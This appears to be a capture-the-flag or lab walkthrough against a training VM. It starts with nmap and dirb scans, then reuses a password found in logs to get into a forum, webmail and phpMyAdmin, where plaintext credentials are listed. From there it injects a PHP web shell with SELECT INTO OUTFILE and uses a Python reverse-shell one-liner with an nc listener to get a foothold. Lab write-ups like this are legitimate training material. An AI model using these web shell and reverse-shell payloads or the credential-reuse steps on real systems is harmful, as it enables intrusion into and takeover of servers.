## nmap
scan the network 10.11.0.0/16
```
Nmap scan report for 10.11.100.94
Host is up (0.0013s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

## dirb 

DIRB IS a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
![ alt text for screen readers](imgs/dirb_scanHTTP.png "dirb_scanHTTP")
![ alt text for screen readers](imgs/dirb_scanHTTPS.png "dirb_scanHTTP")

## 
from threats posted on the forum i found an intersting one "login problem"
reading the logs , a line says: 'Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2'
    - sounds like someone write a password in username field.
    - tried to connect using ssh users form forum and this password (didn't work)
    - tried to log in to forum with:
    ```
    username: lmezard
    password: !q\]Ej?*5K5cy*AJ
    ```
    - it works , i also got the email from the user profile
    email: laurie@borntosec.net

### The same password was used to log in to webmail
    user: laurie@borntosec.net
    password: !q\]Ej?*5K5cy*AJ

+ on the inbox i there's a mail contain credential to a databases 
![ alt text for screen readers](imgs/db_access.png "db credentials")

## access phpMyAdmin

login: root

password: Fg-'kKXBj87E:aJ$

## inject a webshell in sql 
ressource: https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/pyload.php"



export RHOST="10.12.100.143";export RPORT=3412;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

## GET a foothold on the machine 

open a port and start listening for incoming connection

nc -lk -p 3412

encode the pyload and pass it to cmd in : https://10.12.100.143/?cmd=(encoded pyload)
